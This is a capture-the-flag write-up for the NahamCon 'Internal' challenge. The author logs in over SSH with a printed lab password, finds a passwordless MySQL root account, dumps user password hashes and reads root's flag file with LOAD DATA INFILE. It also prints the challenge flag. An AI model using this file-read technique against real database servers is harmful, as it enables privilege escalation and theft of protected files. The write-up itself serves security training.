# Internal

Tags: _mysql_

## Challenge

>Author: @JohnHammond#6971
>
>This is Stage 2 of Path 3 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.
>
>Escalate your privileges and retrieve the flag out of root's home directory.
>
>Use credentials you have gathered previously to access this challenge.
>
>Press the Start button on the top-right to begin this challenge.
>
>Connect with:
>
>ssh -p 32540 challenge.nahamcon.com


## Solving

```
ssh orion@challenge.nahamcon.com -p 32540`
orion@challenge.nahamcon.com' password: stars4love4life
```

```
orion@internal-d6fa40a2436093de-7f7c689f69-l4scs:~$ cd / && ls
-rwxr-xr-x   1 root root 1.2K Mar 11 05:18 create_mysql_admin_user.sh
drwxr-xr-x   5 root root  360 Mar 16 12:05 dev
drwxr-xr-x   1 root root 4.0K Mar 16 12:05 etc
drwxr-xr-x   1 root root 4.0K Mar 11 05:18 home
drwxr-xr-x   1 root root 4.0K Feb 15  2016 lib
drwxr-xr-x   2 root root 4.0K Jan 19  2016 lib64
drwxr-xr-x   2 root root 4.0K Jan 19  2016 media
drwxr-xr-x   2 root root 4.0K Apr 10  2014 mnt
-rwxr-xr-x   1 root root  268 Mar 11 05:18 mysql-setup.sh
drwxr-xr-x   2 root root 4.0K Jan 19  2016 opt
dr-xr-xr-x 579 root root    0 Mar 16 12:05 proc
drwx------   1 root root 4.0K Mar 11 05:20 root
drwxr-xr-x   1 root root 4.0K Mar 16 12:08 run
-rwxr-xr-x   1 root root  549 Feb 15  2016 run.sh

orion@internal-d6fa40a2436093de-7f7c689f69-l4scs:~$ mysql -u root

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
+--------------------+

mysql> use mysql;

mysql> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+

mysql> select User, Password from user;
+-------+-------------------------------------------+
| User  | Password                                  |
+-------+-------------------------------------------+
| root  |                                           |
| root  |                                           |
| root  |                                           |
| root  |                                           |
| admin | *7370B10662892345DC723A04F75F7059E1611A7B |
+-------+-------------------------------------------+
```

```
mysql> LOAD DATA INFILE '/root/flag.txt' INTO TABLE db FIELDS TERMINATED BY '\n';
Query OK, 1 row affected, 21 warnings (0.02 sec)
Records: 1  Deleted: 0  Skipped: 0  Warnings: 21

mysql> select * from db;
+----------------------------------------+----+------+-------------+-------------+-------------+-------------+-------------+-----------+------------+-----------------+------------+------------+-----------------------+------------------+------------------+----------------+---------------------+--------------------+--------------+------------+--------------+
| Host                                   | Db | User | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Create_tmp_table_priv | Lock_tables_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Execute_priv | Event_priv | Trigger_priv |
+----------------------------------------+----+------+-------------+-------------+-------------+-------------+-------------+-----------+------------+-----------------+------------+------------+-----------------------+------------------+------------------+----------------+---------------------+--------------------+--------------+------------+--------------+
| flag{183bdf6f145a1c97f0b4f520355e8ed5} |    |      |             |             |             |             |             |           |            |                 |            |            |                       |                  |                  |                |                     |                    |              |            |              |
+----------------------------------------+----+------+-------------+-------------+-------------+-------------+-------------+-----------+------------+-----------------+------------+------------+-----------------------+------------------+------------------+----------------+---------------------+--------------------+--------------+------------+--------------+
```


`flag{183bdf6f145a1c97f0b4f520355e8ed5}`
